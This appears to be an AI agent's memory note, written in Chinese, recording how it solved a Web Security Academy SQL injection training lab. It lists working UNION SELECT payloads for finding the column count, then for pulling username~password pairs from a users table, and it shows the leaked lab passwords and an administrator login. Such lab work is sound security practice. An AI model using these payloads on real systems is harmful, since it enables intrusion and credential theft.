---
metadata:
  node_type: memory
name: "PRS arm A lab-retrieve-multiple-values-in-single-column"
description: "arm A 基线:lab-retrieve-multiple-values-in-single-column 冷实例一次通过 - 2 列(仅第 2 列回显文本),NULL,username||'~'||password 泄 administrator 口令后登录即 solved"
last_updated: 2026-10-09T05:14:17+08:00
created: 2026-10-09T05:14:17+08:00
---

# PRS arm A baseline: lab-retrieve-multiple-values-in-single-column (2026-10-09)

## 终态
solved（banner_verdict: solved=true, "Congratulations, you solved the lab!"）。

## 环境
- range_launch launch-url /web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column → 冷实例 reused:false，实例 https://0a93002303cb2c1a81ca34a800ac0094.web-security-academy.net/（jar /tmp/cj1.json）。

## 步骤（全部走件）
1. cache_probe(一个信封 8 探针, --marker unio --body-limit 100) 定列数与文本列：
   - `/filter?category=Gifts' UNION SELECT NULL,'X'-- ` → 200（列数 2、文本列=第 2 列）
   - 其余 1 列/3 列/4 列、以及第 1 列放字符串者 → 500
   坑：--marker 在本页不可判别（基础页正文也含该子串），判据用 status + body_len（200 且 body_len 4995 vs 基线 4857）。
2. cache_probe(3 探针, --body-limit 5200) 取多值拼单列：
   - `Gifts' UNION SELECT NULL,username||'~'||password FROM users-- ` → 200，表格行直接泄出
   - 同效：`CONCAT(username,'~',password)`
   - `username+'~'+password` → 500（非 SQL Server 语法）
   实取：carlos~j96dhhk6aq3kwl94ddpi、wiener~m2e6dhsouxvw01htwhke、administrator~y2s6nxbd4h8s48cchg1i
3. http_session get /login --out /tmp/login.html 读 csrf；post /login（csrf+administrator+口令）→ 302 /my-account?id=administrator，同页回显 "Your username is: administrator"。
4. banner_verdict 首页 → solved=true。

## 关键点
- 本题解条件=以 administrator 登录（无需二次写操作）。
- 单列拼接顺序按题面取 `|| '~' ||`；`--` 后必须带空格（用 %20 编码落在 URL 尾部，服务端未裁）。
- cache_probe 是定列数/取多值的合适件：一个信封装多探针 + 每探针 body 片段，免去逐条 http_session。

